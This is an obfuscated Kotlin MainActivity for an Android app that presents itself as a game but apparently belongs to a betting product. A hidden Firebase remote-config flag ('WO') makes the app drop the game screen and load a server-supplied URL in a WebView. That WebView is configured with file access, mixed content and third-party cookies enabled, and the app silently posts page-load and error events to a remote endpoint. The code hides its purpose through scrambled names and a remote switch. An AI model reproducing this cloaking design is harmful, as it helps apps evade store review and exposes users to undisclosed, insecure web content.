package com.mo.bet.app.gb.mos.game

import android.graphics.Bitmap
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import android.view.animation.Animation
import android.view.animation.AnimationUtils
import android.webkit.*
import android.widget.Toast
import androidx.annotation.RequiresApi
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.mo.bet.app.gb.mos.game.databinding.ActivityMainBinding
import com.mo.bet.app.gb.mos.game.fragments.StartFragment
import org.json.JSONObject
import java.util.*

lateinit var sdhjdljsiklfjsasdsfdasa: ActivityMainBinding
var sfdaskukjdhjaosldksigfudkjshfsj: String? = null
var dskudsakjhjadhjdasbdkajsad: String? = null
var idajksfjkhgsnlijkfnmskdlffdsf: String? = null
var gshdfjfgdskdnrgjnmfdsf: Boolean = false
lateinit var dfjjhghjsiudfhjugjfdgfdsfsderf: FirebaseRemoteConfig
class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        sdhjdljsiklfjsasdsfdasa = ActivityMainBinding.inflate(layoutInflater)
        setContentView(sdhjdljsiklfjsasdsfdasa.root)
        val gfhgdsgdkshfufdhgjhsidufjskdf = AnimationUtils.loadAnimation(this, R.anim.anim)
        sdhjdljsiklfjsasdsfdasa.sfdhsgdasdas.startAnimation(gfhgdsgdkshfufdhgjhsidufjskdf)
        gfhgdsgdkshfufdhgjhsidufjskdf.setAnimationListener(object : Animation.AnimationListener{
            override fun onAnimationStart(fdfgkjskdfgufdghsuijkfdsf: Animation?) {
            }

            override fun onAnimationEnd(ksjknldkfjsbakjfdsd: Animation?) {
                olskjadjhfalifjbfskfjhdgdsfsdfk()

            }

            override fun onAnimationRepeat(skfhgjdkfuhjghsdksad: Animation?) {
            }
        })
        supportFragmentManager
            .beginTransaction()
            .replace(sdhjdljsiklfjsasdsfdasa.gjfshdjfgasd.id, StartFragment())
            .commit()
    }

    private fun olskjadjhfalifjbfskfjhdgdsfsdfk() {
        dfjjhghjsiudfhjugjfdgfdsfsderf = FirebaseRemoteConfig.getInstance()
        val getBase = FirebaseRemoteConfigSettings.Builder().setMinimumFetchIntervalInSeconds(3600).build()
        dfjjhghjsiudfhjugjfdgfdsfsderf.setConfigSettingsAsync(getBase)
        dfjjhghjsiudfhjugjfdgfdsfsderf.setDefaultsAsync(R.xml.remote_config_defaults)
        dfjjhghjsiudfhjugjfdgfdsfsderf.fetchAndActivate()
            .addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {
                    val sjhkfgflidjkhgsidkjhgflifjkdhgajkfdg: Boolean = dfjjhghjsiudfhjugjfdgfdsfsderf.getBoolean("WO")
                    if (sjhkfgflidjkhgsidkjhgflifjkdhgajkfdg == true) {
                        dskudsakjhjadhjdasbdkajsad = dfjjhghjsiudfhjugjfdgfdsfsderf.getString("ul1")
                        Log.d("link1", dskudsakjhjadhjdasbdkajsad.toString())
                        idajksfjkhgsnlijkfnmskdlffdsf = dfjjhghjsiudfhjugjfdgfdsfsderf.getString("ul2")

                        dsfkdhgjhdgfijhdliusdkajplfds()
                        sjkhglfirhglurijkfjertkgjfds()


                    } else {
                        sdhjdljsiklfjsasdsfdasa.gjfshdjfgasd.visibility = View.VISIBLE
                        sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.visibility = View.GONE
                        sdhjdljsiklfjsasdsfdasa.sfdhsgdasdas.visibility = View.GONE


                    }

                } else {
                    Toast.makeText(this, "No Connected", Toast.LENGTH_SHORT).show()

                }

            }
    }

    private fun sjkhglfirhglurijkfjertkgjfds() {

        val dfgdhfjkuhjhgfdghygjuki = Volley.newRequestQueue(this)
        val bgnmggfdhjkgfhhtjythgf = JSONObject()
        bgnmggfdhjkgfhhtjythgf.put("appsFlyerId", "null")
        bgnmggfdhjkgfhhtjythgf.put("apsInfo", "MainView")
        bgnmggfdhjkgfhhtjythgf.put("deeplink", if(sfdaskukjdhjaosldksigfudkjshfsj == null) JSONObject.NULL else "false")
        var dkgfnmnljkdsfijgbkdfjkk = dskudsakjhjadhjdasbdkajsad

        val kjkgfsnlkfjhgkdfjgnbhjsfhf = object: JsonObjectRequest(
            Request.Method.POST, dkgfnmnljkdsfijgbkdfjkk, bgnmggfdhjkgfhhtjythgf,
            { response ->
                Log.d("open1", response.getBoolean("success").toString())
                if(response.getBoolean("success")) {

                    gshdfjfgdskdnrgjnmfdsf = true
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.settings.javaScriptEnabled = true
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.settings.domStorageEnabled = true
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.settings.useWideViewPort = true
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.settings.loadWithOverviewMode = true
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.settings.allowFileAccess = true
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.settings.javaScriptCanOpenWindowsAutomatically = true
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.settings.setSupportMultipleWindows(false)
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.settings.displayZoomControls = false
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.settings.builtInZoomControls = true
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.settings.setSupportZoom(true)
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.settings.pluginState = WebSettings.PluginState.ON
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.settings.mixedContentMode = 0
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.settings.allowContentAccess = true
                    CookieManager.getInstance().setAcceptCookie(true)
                    CookieManager.getInstance().setAcceptThirdPartyCookies(sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd, true)

                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.webViewClient = object : WebViewClient() {
                        override fun onPageStarted(dsfghf: WebView?, str: String?, map: Bitmap?) {
                            super.onPageStarted(dsfghf, str, map)

                        }

                        override fun onPageFinished(v: WebView, ghdgdkfsjgbergjsklf: String) {
                            sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.visibility = View.VISIBLE
                            sdhjdljsiklfjsasdsfdasa.gjfshdjfgasd.visibility = View.GONE
                            sdhjdljsiklfjsasdsfdasa.sfdhsgdasdas.visibility = View.GONE

                           // bindingMain.loading.visibility = View.GONE
                            dgfhdsjkghgjhdkjgfjasdd(ghdgdkfsjgbergjsklf)

                        }

                        override fun onReceivedHttpError(
                            rftgrhytur: WebView?,
                            gthyjkihgfrds: WebResourceRequest?,
                            rfgthyjuikiygtrfe: WebResourceResponse?
                        ) {
                            super.onReceivedHttpError(rftgrhytur, gthyjkihgfrds, rfgthyjuikiygtrfe)
                            fghyugrfsgtyrfref( rfgthyjuikiygtrfe!!.statusCode.toString())

                        }

                        @RequiresApi(Build.VERSION_CODES.M)
                        override fun onReceivedError(fghjihytgrfgtdhytju: WebView?, gthyjuikyoykiuyhftg: WebResourceRequest?, fghjukioijuhygrtffrgthy: WebResourceError?) {
                            super.onReceivedError(fghjihytgrfgtdhytju, gthyjuikyoykiuyhftg, fghjukioijuhygrtffrgthy)
                            fghyugrfsgtyrfref( fghjukioijuhygrtffrgthy.toString())
                        }
                    }

                    Log.d("mainLink", response.getString("url"))
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.loadUrl(response.getString("url"))

                }
                else{
                    sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.visibility = View.GONE
                    sdhjdljsiklfjsasdsfdasa.gjfshdjfgasd.visibility = View.VISIBLE
                    sdhjdljsiklfjsasdsfdasa.sfdhsgdasdas.visibility = View.GONE


                }
            }, { error ->
                sdhjdljsiklfjsasdsfdasa.khsjfsdaskdlasd.visibility = View.GONE
                sdhjdljsiklfjsasdsfdasa.sfdhsgdasdas.visibility = View.GONE

                sdhjdljsiklfjsasdsfdasa.gjfshdjfgasd.visibility = View.VISIBLE

            }
        ) {

        }
        dfgdhfjkuhjhgfdghygjuki.add(kjkgfsnlkfjhgkdfjgnbhjsfhf)
    }

    private fun fghyugrfsgtyrfref(dfrgtre: String) {

        val rfgtrerd = Volley.newRequestQueue(this)
        val ghyrgefsd = JSONObject()
        ghyrgefsd.put("name", "a_e_w")
        val rtghyrgtfsd = JSONObject()
        rtghyrgtfsd.put("success", true)
        rtghyrgtfsd.put("url", dskudsakjhjadhjdasbdkajsad)
        rtghyrgtfsd.put("error", dfrgtre)

        ghyrgefsd.put("data", rtghyrgtfsd)
        ghyrgefsd.put("created", sfjkgfskldfjodiskfs())
        var fghgrtef = idajksfjkhgsnlijkfnmskdlffdsf

        val rtyhrertefd = object: JsonObjectRequest(
            Request.Method.POST, fghgrtef, ghyrgefsd,
            { response ->

            }, { error ->

            }
        ) {

        }
        rfgtrerd.add(rtyhrertefd)
    }

    private fun dgfhdsjkghgjhdkjgfjasdd(frghyrtgefd: String) {

        val dfrgthretgrefd = Volley.newRequestQueue(this)
        val dfghegtrfeds = JSONObject()
        dfghegtrfeds.put("name", "a_p_f")
        val kythtbfdsh = JSONObject()
        kythtbfdsh.put("success", true)
        kythtbfdsh.put("url", frghyrtgefd)
        dfghegtrfeds.put("data", kythtbfdsh)
        dfghegtrfeds.put("created", sfjkgfskldfjodiskfs())
        var skflgjfdoskglsifjhkgldkafg = idajksfjkhgsnlijkfnmskdlffdsf

        val kfjgksfudhjgkdsjfhsad = object: JsonObjectRequest(
            Request.Method.POST, skflgjfdoskglsifjhkgldkafg, dfghegtrfeds,
            { response ->
            }, { error ->
            }
        ) {
            
        }
        dfrgthretgrefd.add(kfjgksfudhjgkdsjfhsad)
    }




    private fun dsfkdhgjhdgfijhdliusdkajplfds() {
        val sgfjlfdsjkgbsjhfgbsfjdkgsfsd = Volley.newRequestQueue(this)
        val dgkgfsdhjdsajkfsk = JSONObject()
        dgkgfsdhjdsajkfsk.put("name", "a_o")
        val ghdfskhjfbsjkdlad = JSONObject()
        ghdfskhjfbsjkdlad.put("success", true)
        dgkgfsdhjdsajkfsk.put("data", ghdfskhjfbsjkdlad)
        dgkgfsdhjdsajkfsk.put("created", sfjkgfskldfjodiskfs())
        var hfgldfkjldsjf = idajksfjkhgsnlijkfnmskdlffdsf
        val lihfdjkhljhdilfsf = object: JsonObjectRequest(
            Request.Method.POST, hfgldfkjldsjf, dgkgfsdhjdsajkfsk,
            { response ->

            }, { error ->

            }
        ) {
          
        }
        sgfjlfdsjkgbsjhfgbsfjdkgsfsd.add(lihfdjkhljhdilfsf)
     }

    private fun sfjkgfskldfjodiskfs(): Long {
        val kfgkjhdskjhfsikfsdf: Date = Calendar.getInstance().time
        return kfgkjhdskjhfsikfsdf.time
    }
}
